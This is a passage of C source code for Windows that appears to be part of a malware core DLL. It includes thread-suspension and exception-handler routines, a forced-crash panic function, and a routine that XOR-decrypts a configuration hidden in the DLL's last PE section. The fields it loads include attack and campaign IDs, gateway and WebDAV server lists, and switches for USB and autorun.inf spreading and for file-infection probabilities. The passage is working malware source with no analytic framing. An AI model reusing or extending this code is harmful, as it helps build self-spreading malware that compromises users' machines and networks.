	DEBUG("Halting all threads (%d)!", local_thread_counter);
#endif

	for (i = 0; i < local_thread_counter; i++) {

		if (GetCurrentThreadId() != local_threads[i]) {

#ifdef DEBUG_OUT
		DEBUG("Suspending thread %d 0x%08x", i, local_threads[i]);
#endif

			thread = OpenThread(THREAD_ALL_ACCESS, TRUE, local_threads[i]);
			SuspendThread(thread);
			CloseHandle(thread);
		} else {

#ifdef DEBUG_OUT
			DEBUG("Thread %d 0x%08x is TL Handler!", i, local_threads[i]);
#endif

		}
	}

#ifdef DEBUG_OUT
	DEBUG("Releasing Exception Handler");
#endif

	SetUnhandledExceptionFilter(orig_top_level_exception_filter);

#ifdef DEBUG_OUT
	DEBUG("Pausing Callback and detatching...");
#endif

	Sleep(INFINITE);
}
#endif

#ifdef _WIN64
static LONG CALLBACK top_level_exception_handler(PEXCEPTION_POINTERS exception_pointer)
{
	MEMORY_BASIC_INFORMATION	mem_info			= {0};
	HANDLE						thread;
	int							i;

#ifdef DEBUG_OUT

	DEBUG("!!!\n\n\n\n\tTL_EXCEPTION_HANDLER \n\tCRITICAL ERROR 0x%16x \n\tTID: 0x%16x\n\tPID: %d\n\n\n", exception_pointer->ExceptionRecord->ExceptionCode, GetCurrentThreadId(), GetCurrentProcessId());
	DEBUG("\n\nDEBUG:\n\teip: \t\t\t0x%16x\n\tExceptionAddress: \t0x%16x\n", exception_pointer->ContextRecord->Rip, exception_pointer->ExceptionRecord->ExceptionAddress);

#endif

	// Get EIP info
#ifdef DEBUG_OUT 
	DEBUG("FAULTING EIP @ 0x%08x", exception_pointer->ContextRecord->Rip);
	VirtualQuery((LPCVOID)exception_pointer->ContextRecord->Rip, &mem_info, sizeof(MEMORY_BASIC_INFORMATION));
	if (mem_info.Type == MEM_COMMIT) {
		DEBUG("\t\t: 0x%16x", exception_pointer->ContextRecord->Rip);
	} else {
		DEBUG("\t\t: INVALID EIP (ACCESS VIOLATION)");
	}
#endif

	if (exception_pointer->ContextRecord->Rip == PANIC_EIP) {
#ifdef DEBUG_OUT
		DEBUG("::::SYSTEM PANIC WAS CALLED - EXCEPTION FORCED");
#endif
	}

#ifdef DEBUG_OUT
	DEBUG("Halting all threads (%d)!", local_thread_counter);
#endif

	for (i = 0; i < local_thread_counter; i++) {

		if (GetCurrentThreadId() != local_threads[i]) {

#ifdef DEBUG_OUT
		DEBUG("Suspending thread %d 0x%08x", i, local_threads[i]);
#endif

			thread = OpenThread(THREAD_ALL_ACCESS, TRUE, local_threads[i]);
			SuspendThread(thread);
			CloseHandle(thread);
		} else {

#ifdef DEBUG_OUT
			DEBUG("Thread %d 0x%08x is TL Handler!", i, local_threads[i]);
#endif

		}
	}

#ifdef DEBUG_OUT
	DEBUG("Releasing Exception Handler");
#endif

	SetUnhandledExceptionFilter(orig_top_level_exception_filter);

#ifdef DEBUG_OUT
	DEBUG("Pausing Callback and detatching...");
#endif

	Sleep(INFINITE);
}
#endif

BOOL thread_control(BOOL suspend, INT threads[MAX_THREADS], PINT thread_count)
{
	HANDLE			snapshot, thread;
	DWORD			current_thread;
	DWORD			pid;
	THREADENTRY32	thread_entry32;

	pid							= GetCurrentProcessId();
	current_thread				= GetCurrentThreadId();

	thread_entry32.dwSize		= sizeof(THREADENTRY32);
	snapshot 					= CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	if (snapshot == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	*thread_count = 0;

	if (Thread32First(snapshot, &thread_entry32)) {
		while (TRUE) {

			if((thread_entry32.th32OwnerProcessID == pid) && (thread_entry32.th32ThreadID != current_thread)) {
				if (suspend == TRUE) {
					// Suspend threads
					threads[*thread_count] = thread_entry32.th32ThreadID;
					(*thread_count)++;
					
					thread = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_entry32.th32ThreadID);
					if (thread == NULL) {
						return FALSE;
					}

					if (SuspendThread(thread) == -1) {
						return FALSE;
					}

					CloseHandle(thread);
					thread = INVALID_HANDLE_VALUE;
				} else {
					// Resume threads
					thread = OpenThread(THREAD_ALL_ACCESS, FALSE, thread_entry32.th32ThreadID);
					if (thread == NULL) {
						return FALSE;
					}

					if (ResumeThread(thread) == -1) {
						return FALSE;
					}

					CloseHandle(thread);
					thread = INVALID_HANDLE_VALUE;
				}
			}

			// Next thread
			if (Thread32Next(snapshot, &thread_entry32) == FALSE) break;
		}
	}
	return TRUE;
}

VOID panic(VOID)
{
	HANDLE		thread;
	UINT		i;
	VOID		(*fault)(VOID);

#ifdef DEBUG_OUT
	DEBUG("SYSTEM PANIC CALLED. FORCING EXCEPTION.");
#endif

	fault = (VOID (*)(VOID))PANIC_EIP;
	fault();


	for (i = 0; i < local_thread_counter; i++) {

		if (GetCurrentThreadId() != local_threads[i]) {

#ifdef DEBUG_OUT
		DEBUG("Suspending thread %d 0x%08x",	 i, local_threads[i]);
#endif

			thread = OpenThread(THREAD_ALL_ACCESS, TRUE, local_threads[i]);
			SuspendThread(thread);
			CloseHandle(thread);
		} else {

#ifdef DEBUG_OUT
			DEBUG("Thread %d 0x%08x is TL Handler!", i, local_threads[i]);
#endif

		}
	}

	return;
}

VOID extract_user_config(VOID)
{
	PUSER_CONFIGURATION				user_config;
	PIMAGE_DOS_HEADER				dos_header;
	PIMAGE_NT_HEADERS				nt_headers;
	PIMAGE_SECTION_HEADER			section_header;
	PDWORD							module_base;
	PDWORD							decrypted_buffer;
	DWORD							tmp_key;
	PBYTE							ptr;
	INT								i;

	//BREAK;

#ifdef _WIN64
	module_base = (PDWORD)get_local_dll_base64();
#else
	module_base = (PDWORD)get_local_dll_base();
#endif

	//BREAK;

	dos_header	= (PIMAGE_DOS_HEADER)module_base;
	nt_headers	= (PIMAGE_NT_HEADERS)((DWORD_PTR)dos_header + dos_header->e_lfanew);

	section_header = IMAGE_FIRST_SECTION(nt_headers);
	section_header = (PIMAGE_SECTION_HEADER)((DWORD_PTR)section_header + (DWORD)(sizeof(IMAGE_SECTION_HEADER) * (nt_headers->FileHeader.NumberOfSections - 1)));

	//BREAK;

	user_config = (PUSER_CONFIGURATION)((DWORD_PTR)module_base + section_header->VirtualAddress);

#ifndef DO_NOT_ENCRYPT_CORE_DATA
	decrypted_buffer = (PDWORD)HeapAlloc(GetProcessHeap(), 0, section_header->SizeOfRawData);
	ZeroMemory(decrypted_buffer, section_header->SizeOfRawData);
	CopyMemory(decrypted_buffer, user_config, section_header->SizeOfRawData);

	// Allocate new memory decrypted data
	tmp_key				= user_config->key;
	ptr					= (PBYTE)((DWORD_PTR)decrypted_buffer + 4);
	for (i = 0; i < section_header->SizeOfRawData - 4; i++) {

		*ptr = (BYTE)(*ptr ^ tmp_key);

		tmp_key = tmp_key >> 8;

		if (tmp_key == 0) {
			tmp_key = user_config->key;
		}

		ptr++;
	}

	user_config = (PUSER_CONFIGURATION)decrypted_buffer;

	*(PDWORD)((DWORD_PTR)user_config + user_config->offset_to_webdavs + user_config->size_of_webdavs) = 0;
#endif

	//BREAK;
#ifdef DEBUG_OUT
	DEBUG("+core> \nUSER_CONFIGURATION:\n\tKEY: \t\t0x%08x\n\tAttack ID: \t%d\n\tCampaign ID: \t%d\n\tGateways: \n%s\n\tWebdavs: \n%s\n", user_config->key, user_config->attack_id, user_config->campaign_id, user_config->offset_to_gates + (DWORD_PTR)user_config, user_config->offset_to_webdavs + (DWORD_PTR)user_config);
#endif

	// Build our global configuration structure
	ZeroMemory(&global_config, sizeof(GLOBAL_CONFIGURATION));
	global_config.attack_id				= user_config->attack_id;
	global_config.campaign_id			= user_config->campaign_id;
	global_config.gate_list_string		= (LPCSTR)(user_config->offset_to_gates + (DWORD_PTR)user_config);
	global_config.webdav_list_string	= (LPCSTR)(user_config->offset_to_webdavs + (DWORD_PTR)user_config);
	global_config.key					= user_config->key;
	global_config.webdav_list_size		= user_config->size_of_webdavs;
	global_config.gate_list_size		= user_config->size_of_gates;

	// Copy all the other switches
	global_config.ntm					= user_config->ntm;
	global_config.usb					= user_config->usb;
	global_config.autorun				= user_config->autorun;
	global_config.date					= user_config->date;
	global_config.rto					= user_config->rto;
	global_config.wrapper				= user_config->wrapper;
	global_config.pe					= user_config->pe;
	global_config.pe_probability		= user_config->pe_probability;
	global_config.wrapper_probability	= user_config->wrapper_probability;
	global_config.pif_probability		= user_config->pif_probability;
	global_config.ignored_days			= user_config->ignored_days;

#ifdef DEBUG_OUT
	DEBUG("Builder Specified Configuration:\nnTM: \t\t\t%d\nUSB Ops: \t\t%d\nautorun.inf: \t\t%d\ndate appender: \t\t%d\nRTO: \t\t\t%d\nWrapper: \t\t%d\nPE: \t\t\t%d\nPE Chance: \t\t%d\%\nWrapper Chance: \t%d\%\nPIF Chance: \t\t%d\%\nIgnore Time: \t\t%d Days\nEND CONFIG\n", global_config.ntm, global_config.usb, global_config.autorun, global_config.date, global_config.rto, global_config.wrapper, global_config.pe, global_config.pe_probability, global_config.wrapper_probability, global_config.pif_probability, global_config.ignored_days);
#endif

	//Sleep(INFINITE);

	return;
}

